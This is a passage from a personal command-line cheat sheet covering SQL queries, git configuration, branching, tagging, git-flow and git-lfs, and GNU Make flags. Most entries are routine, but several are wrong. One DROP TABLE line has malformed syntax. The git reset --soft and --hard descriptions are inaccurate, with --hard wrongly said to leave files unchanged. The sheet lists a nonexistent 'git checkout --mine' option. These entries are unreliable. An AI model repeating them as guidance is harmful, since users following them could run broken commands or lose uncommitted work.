  ON a.id=b.id;
SELECT a.*, b.*, c.*                    # 3-way join AKA inner join
  FROM (a JOIN b ON a.id=b.id)
  JOIN c ON (b.id=c.id);
SELECT MAX(id) FROM table               # last auto-generated id from table
SELECT LAST_INSERT_ID()                 # last auto-generated id, globally
SELECT * FROM table ORDER BY x ASC;     # sort on x, ascending
SELECT * FROM table ORDER BY x DESC;    # sort on x, descending
SELECT * FROM table LIMIT 1;            # return one result
SELECT * FROM table ORDER BY x ASC LIMIT 1  # FIRST
SELECT * FROM table ORDER BY x DESC LIMIT 1 # LAST
CREATE DATABASE db;                     # create new database db
SHOW DATABASES;                         # list all databases
DROP DATABASE db;                       # delete database
SHOW CREATE TABLE table;                # print statement to create table
USE db;                                 # open database db
SHOW TABLES;                            # list tables in db
DROP TABLE table;                       # delete table
DROP TABLE table IF EXISTS table;       # delete table if it exists
INSERT INTO table (col, ...)            # add a row
  VALUES ('val', ...);                  # ...
DELETE FROM table WHERE column="value"; # remove a row


########################################
# git

# One-time setup for a user
git config --global user.name "Name"    # Your name for author when committing
git config --global user.email "email"  # email address (global)
git config user.email "email"           # email address for one project
git config --global color.diff auto     # colors: git diff
git config --global color.status auto   # colors: git status
git config --global color.branch auto   # colors: git branch

# One-time setup for a project
git clone ssh://USERNAME@SERVER/~/opt/git/PROJECT.git # server
git clone git@github.com:REPO/PROJECT.git             # github
git clone https://github.com/REPO/PROJECT.git         # github anonymouse
git init DIR                                          # no server

# Basic workflow
git pull                                # update local copy
  ... work on stuff
git add FILE                            # add file to commit
git status                              # see what's been added or modified
git commit                              # commit any added files
git push                                # push changes to server

# Repository setup on a server (without github)
ssh SERVER                              # alternative: use shared network volume
mkdir -p ~/opt/git/PROJECT.git          # make directory
git init --bare ~/opt/git/PROJECT.git   # intialize bare repository

# Repository setup on github
https://github.com -> "make a new repository"   # Create a new repository
https://help.github.com/articles/generating-ssh-keys/ # SSH keys
https://help.github.com/articles/remove-sensitive-data/ # remove sensitive data

# Update your local copy, merging from repository, manual
git fetch origin                        # fetch from origin
git fetch --prune                       # remove stale local branches
git fetch -vp                           # ^^^ + verbose
git diff master origin/master           # see changes
git merge origin/master                 # this will be a FF if no local changes

# Commit
git branch -v                           # check your branch
git status                              # check file modifications
git add FILE                            # add file to commit
git commit                              # commit, with a message
git push                                # push the commit(s) to server

# Undo
git checkout FILE                       # revert FILE to last checked-in version
git reset --soft                        # changes to tracked files are discarded
git reset --soft HEAD~                  # discard commits that aren't pushed
git reset --hard                        # reset head to COM, files unchanged
git rm -r --cached DIR                  # undo git add, without removing files
git clean -xf                           # restore to "clean repo", DELETES
git commit --amend                      # Combine this commit with previous
git rev-list -n 1 HEAD -- FILE          # 1. Commit of a deleted file
git checkout COMMIT^ -- FILE            # 2. Recover deleted file

# Temporarily stash work, restoring a clean set of files
git stash                               # stash current modifications on stack
git stash list                          # view stash stack
git stash apply                         # "unstash" top of stack

# Ignore some files (don't version them)
echo '*~' > .gitignore                  # ignore emacs backup files
git add .gitignore                      # git should track ignore file itself
git commit                              # git should track ignore file itself

# History
git rev-parse HEAD                      # hash current commit
git log                                 # commit history
git log FILE                            # commit history for one file
git log --oneline                       # less info
git log --oneline --decorate --graph --all # more info
git log --graph --abbrev-commit --decorate --date=relative --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold blue)- %an%C(reset)%C(bold yellow)%d%C(reset)' --all

# Versions of a file
git show REV:FILE                       # Old version of file
git show HEAD^ FILE                     # last committed version
git show HEAD~4:FILE                    # 4th last commit

# Remote repositories
git remote                              # list names of remote repositories
git remote show origin                  # more info
git remote set-url origin NEW_URL       # change location of repo
git branch -vv                          # branch remotes

# Branching
git branch                              # view current and local branches
git branch -a                           # view all branches
git branch -vv                          # include tracking and commit info
git checkout BRANCH                     # switch to local BRANCH
git checkout --track origin/BRANCH      # switch to remote BRANCH
git checkout -b BRANCH                  # create a new branch and switch to it
git push origin BRANCH                  # push BRANCH to remote
git branch --set-upstream-to=origin/BRANCH BRANCH # fix tracking

# Branching Model  http://nvie.com/posts/a-successful-git-branching-model/
git checkout -b feature/F develop       # start working on a new feature "F"
git add FILE                            # add files
git commit                              # commit to branch feature/F
git push origin feature/F               # push branch to remote
git checkout develop                    # switch to develop branch
git merge --no-ff feature/F             # merge F into develop, keep branch info
git branch -d F                         # delete F branch
git push origin develop                 # push to server
git push origin ":F"                    # remove F branch from server

# Automated branching model
# https://danielkummer.github.io/git-flow-cheatsheet/
brew install git-flow-avh               # Install
git flow init                           # Initialize inside a repository
git flow feature start NAME             # Start a new feature
git flow feature finish NAME            # Finish a feature
git flow feature publish NAME           # Publish a feature
git flow feature pull origin NAME       # Get feature published by another user
git flow feature track NAME             # Track a feature on origin
git flow release start RELEASE          # Start a release
git flow release publish RELEASE        # Publish a release
git flow release track RELEASE          # Track a release
git flow release finish RELEASE         # Finish a release
git push --tags                         # Push release tags
git flow hotfix start VERSION           # Start a hotfix
git flow hotfix finish VERSION          # Finish a hotfix

# Tagging
git tag                                 # list tags
git tag TAG                             # apply lightweight tag
git tag -a TAG                          # apply annotated tag
git tag -a TAG REV                      # apply annotated tag to REV commit
git push --tags                         # make tags public
git checkout tags/TAG                   # checkout a tag as detacted HEAD

# Comparing
git diff BRANCH1 BRANCH2                # diff two local branches
git diff master remotes/origin/dataset  # diff two remote branches
git mergetool --tool-help               # list available diff/merge tools
git config --global diff.tool TOOL      # use TOOL for merging
git config --global diff.tool --directory TOOL # use TOOL for dir merging, too

# Merging
git merge develop                       # merge develop into current branch
git cherry-pick 62ecb3                  # merge *one* commit into current branch
git checkout --theirs PATH/FILE         # conflict: keep their file
git checkout --mine PATH/FILE           # conflict: keep my file

# Rebase automatically, resulting in a linear history like Subversion
# Ref: http://stevenharman.net/git-pull-with-automatic-rebase
git config branch.autosetuprebase always
git config branch.develop.rebase true
git config branch.autosetuprebase always

# Tarball of current HEAD
git archive --format tar.gz HEAD > file.tar.gz

# Tracking large files with git-lfs
brew install git-lfs                    # install git-lfs step 1
git lfs install                         # install git-lfs step 2
git lfs track '*.psd'                   # start tracking .psd files
git lfs track                           # types of files managed by git-lfs
git add file.psd                        # (normal git flow)
git commit -m 'blah'                    # (normal git flow)
git push origin master                  # (normal git flow)
git lfs status                          # staged (uncommitted) changes
git lfs ls-files                        # files managed by git-lfs (committed)

# Render github-style Markdown
pip install grip                        # install grip utility
grip -b README.md                       # render README.md in browser


########################################
# GNU Make

make                                    # Build the first target in Makefile
make -f FILE                            # Use FILE as Makefile
make -d                                 # Print debugging information
make -jN                                # Run N parallel jobs
make -k                                 # Keep going after error, if possible
make -n                                 # Dry run
make -r                                 # Eliminate built-in implicit rules
